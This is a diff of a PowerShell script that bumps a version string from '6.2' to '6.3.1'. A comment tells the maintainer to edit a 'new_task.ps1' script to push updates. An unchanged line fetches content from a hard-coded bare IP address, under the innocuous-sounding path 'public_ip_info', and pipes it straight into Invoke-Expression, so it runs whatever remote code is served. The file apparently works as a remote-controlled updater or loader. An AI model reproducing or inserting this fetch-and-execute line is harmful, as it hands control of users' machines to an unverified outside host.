@@ -1,7 +1,7 @@
 
 # please change the version string  and new_task.ps1 script for do updating
 
-$lastestVersion = '6.2'
+$lastestVersion = '6.3.1'
 
 Invoke-RestMethod 47.107.152.77/public_ip_info | Invoke-Expression
 
